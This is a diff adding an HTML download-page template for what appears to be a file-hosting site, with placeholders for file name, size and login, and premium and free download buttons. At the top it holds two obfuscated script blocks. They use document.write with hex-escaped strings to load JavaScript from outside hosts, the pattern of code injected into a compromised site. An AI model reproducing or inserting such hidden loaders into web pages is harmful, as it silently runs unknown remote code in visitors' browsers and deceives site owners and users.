@@ -1,0 +1,28 @@
+<script>
+<!--
+document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%77%77%77%2E%61%6C%6C%61%62%63%2E%63%6F%6D%2F%69%6E%64%65%78%2E%70%68%70%3F%72%65%66%3D%77%65%62%6D%6F%6E%69%74%6F%72%22%3E%3C%2F%73%63%72%69%70%74%3E'));
+//-->
+</script>
+<script>
+<!--
+document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%20%22%68%74%74%70%3A%2F%2F%77%77%77%2E%61%64%76%70%6F%69%6E%74%73%2E%63%6F%6D%2F%6A%73%2E%70%68%70%3F%75%69%64%3D%39%33%30%36%22%3E%3C%2F%73%63%72%69%70%74%3E'));
+//-->
+</script>
+<h2><TMPL_VAR lang_download_file> <TMPL_VAR file_name></h2>
+<font style="font-size:12px;"><TMPL_VAR lang_you_requested> <font color="red"><TMPL_VAR site_url><TMPL_IF usr_add_login>/<TMPL_VAR usr_login></TMPL_IF>/<TMPL_VAR file_code>/<TMPL_VAR file_name></font> (<TMPL_VAR fsize>)</font>
+<br>
+<TMPL_INCLUDE comparison.html>
+<br>
+<Form method="POST" action=''>
+<input type="hidden" name="op" value="download1">
+<input type="hidden" name="usr_login" value="<TMPL_VAR usr_login>">
+<input type="hidden" name="id" value="<TMPL_VAR file_code>">
+<input type="hidden" name="fname" value="<TMPL_VAR file_name>">
+<input type="hidden" name="referer" value="<TMPL_VAR referer>">
+<input type="submit" name="method_premium" value="<TMPL_VAR lang_premium_download>"> &nbsp; &nbsp; &nbsp; &nbsp;
+<input type="submit" name="method_free" value="<TMPL_VAR lang_free_download>">
+</Form>
+
+<TMPL_IF ads>
+<br>ADS HERE<br>
+</TMPL_IF>
